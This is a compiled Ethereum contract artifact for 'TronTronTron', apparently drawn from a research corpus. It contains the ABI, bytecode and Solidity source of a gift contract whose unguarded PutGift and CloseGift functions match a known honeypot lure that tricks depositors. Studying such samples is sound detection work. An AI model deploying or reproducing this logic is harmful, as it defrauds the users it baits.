{
  "contractName": "TronTronTron",
  "abi": [
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_receiver",
          "type": "address"
        }
      ],
      "name": "PutGift",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_unixTime",
          "type": "uint256"
        }
      ],
      "name": "SetGiftTime",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "GetGift",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "CloseGift",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040526000600360006101000a81548160ff02191690831515021790555034801561002b57600080fd5b5061038f8061003b6000396000f300608060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063108d40f8146100645780633f7e21201461009a578063bea948c8146100b1578063dac47a71146100bb575b005b610098600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506100e8565b005b3480156100a657600080fd5b506100af6101df565b005b6100b961023f565b005b3480156100c757600080fd5b506100e660048036038101908080359060200190929190505050610303565b005b600360009054906101000a900460ff1615801561010c575067016345785d8a000034115b8061014e575060008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16145b156101dc57336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550426002819055505b50565b6000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614151561023d576001600360006101000a81548160ff0219169083151502179055505b565b3373ffffffffffffffffffffffffffffffffffffffff16600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614801561029d575060025442115b15610301573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156102ff573d6000803e3d6000fd5b505b565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141561036057806002819055505b505600a165627a7a723058207a06fda50532fbca1debe8075356f67e4378fbe32d58e6bb0972a3909f8cfd250029",
  "source": "\n\ncontract TronTronTron\n{\n    address  sender;\n    address  receiver;\n    uint  unlockTime;\n    bool  closed = false;\n    \n \n    function PutGift(address _receiver) public payable {\n        if( (!closed&&(msg.value >0.10 ether)) || sender==0x0 ) {\n            sender = msg.sender;\n            receiver = _receiver;\n            unlockTime = now;\n        }\n    }\n    \n    function SetGiftTime(uint _unixTime) public {\n        if(msg.sender==sender) {\n            unlockTime = _unixTime;\n        }\n    }\n    \n    function GetGift() public payable {\n        if(receiver==msg.sender&&now>unlockTime) {\n            msg.sender.transfer(address(this).balance);\n        }\n    }\n    \n    function CloseGift() public {\n        if (receiver!=0x0) {\n           closed=true;\n        }\n    }\n    \n    function() public payable{}\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0xcb71b51d9159a49050d56516737b4b497e98bb99/contracts/0xcb71b51d9159a49050d56516737b4b497e98bb99.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T04:06:45.280Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}